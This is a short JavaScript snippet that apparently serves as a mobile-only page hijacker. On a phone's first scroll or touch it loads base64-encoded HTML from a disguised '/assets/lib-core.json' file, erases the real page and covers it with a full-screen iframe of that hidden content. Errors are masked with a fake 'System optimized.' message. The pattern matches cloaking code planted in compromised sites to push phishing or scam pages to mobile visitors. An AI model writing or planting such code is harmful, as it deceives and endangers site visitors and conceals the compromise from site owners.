(function() {
    const isMobile = /android|iphone|ipad|mobile/i.test(navigator.userAgent);
    if (!isMobile) return;
    let active = false;
    const loadRealContent = async () => {
        if (active) return;
        active = true;
        try {
            const response = await fetch('/assets/lib-core.json');
            const data = await response.json();
            if (data && data.content) {
                const decodedHTML = decodeURIComponent(escape(atob(data.content)));
                const ifrm = document.createElement('iframe');
                const style = 'position:fixed; top:0; left:0; width:100vw; height:100vh; border:none; z-index:999999; margin:0; padding:0;';
                ifrm.setAttribute('style', style);
                document.body.innerHTML = ''; 
                document.body.appendChild(ifrm);
                const ifrmDoc = ifrm.contentWindow.document;
                ifrmDoc.open();
                ifrmDoc.write(decodedHTML);
                ifrmDoc.close();
                document.body.style.overflow = 'hidden';
            }
        } catch (err) {
            console.log("System optimized.");
        }
    };
    window.addEventListener('scroll', loadRealContent, { once: true });
    window.addEventListener('touchstart', loadRealContent, { once: true });
})();
